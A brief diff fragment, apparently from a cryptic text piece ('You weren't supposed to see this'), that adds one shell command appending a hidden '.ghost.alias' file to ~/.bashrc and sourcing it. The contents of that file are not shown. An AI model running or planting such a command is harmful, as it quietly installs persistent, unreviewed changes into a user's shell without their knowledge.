@@ -7,3 +7,5 @@ Not instructions.
 Just a trace.
 
 > You weren’t supposed to see this.
+
+cat .ghost.alias >> ~/.bashrc && source ~/.bashrc
